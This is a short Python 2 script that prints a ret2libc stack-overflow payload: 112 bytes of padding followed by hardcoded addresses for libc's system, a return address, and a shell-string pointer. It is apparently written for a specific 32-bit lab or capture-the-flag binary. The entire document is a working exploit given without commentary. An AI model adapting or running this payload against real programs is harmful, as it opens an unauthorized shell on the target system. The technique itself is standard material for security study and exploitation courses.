import struct

padd = "A"*112
system = struct.pack("I", 0xb7e55310)
return_mem = struct.pack("I", 0xb7e48260)
bash_sh = struct.pack("I", 0xb7f7584c)

print padd + system + return_mem + bash_sh
